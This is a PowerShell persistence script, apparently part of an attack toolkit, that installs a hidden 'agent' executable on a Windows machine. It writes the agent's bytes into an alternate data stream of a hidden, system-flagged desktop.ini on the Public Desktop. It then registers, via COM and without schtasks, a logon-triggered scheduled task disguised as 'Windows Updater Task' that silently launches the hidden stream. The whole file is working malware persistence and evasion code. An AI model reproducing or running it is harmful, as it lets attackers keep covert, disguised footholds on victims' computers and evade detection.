param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# ============================================================
# 1. Choose carrier file (Public Desktop\desktop.ini)
# ============================================================
$publicDesktop = "C:\Users\Public\Desktop"
$carrierFile = "$publicDesktop\desktop.ini"
$streamName = "thumbs.db"

# Create carrier if missing
if (-not (Test-Path $carrierFile)) {
    Set-Content -Path $carrierFile -Value "[.ShellClassInfo]" -Encoding ASCII
    attrib +h +s $carrierFile
    Write-Output "[+] Created carrier file: $carrierFile"
} else {
    Write-Output "[+] Using existing carrier file: $carrierFile"
}

# ============================================================
# 2. Hide the real agent in ADS
# ============================================================
Write-Output "[+] Hiding real agent in ADS..."
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$carrierFile`:$streamName"
Write-Output "[+] Real agent hidden at: $hiddenPath"

# ============================================================
# 3. Create scheduled task via COM (no schtasks)
# ============================================================
$taskName = "WindowsUpdaterTask"
$execCommand = "powershell.exe -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"

try {
    # Connect to Task Scheduler
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")

    # Delete existing task if any
    try { $rootFolder.DeleteTask($taskName, 0) } catch { }

    # Create a new task definition
    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3 # TASK_LOGON_INTERACTIVE_TOKEN

    # Add logon trigger
    $trigger = $taskDefinition.Triggers.Create(9) # TASK_TRIGGER_LOGON
    $trigger.UserId = $env:USERNAME

    # Add action (run PowerShell to launch hidden agent)
    $action = $taskDefinition.Actions.Create(0) # TASK_ACTION_EXEC
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"

    # Register the task (6 = UpdateOrCreate, 3 = InteractiveToken)
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null

    Write-Output "[+] Scheduled task '$taskName' created via COM. Agent will run at next logon."
} catch {
    Write-Output "[-] Failed to create scheduled task via COM: $_"
}

# ============================================================
# Done (original agent remains – you can delete it manually if desired)
# ============================================================
Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "===================================="
Write-Output "Real agent hidden in: $hiddenPath"
Write-Output "Original agent still at: $agentPath (you may delete it after reboot)"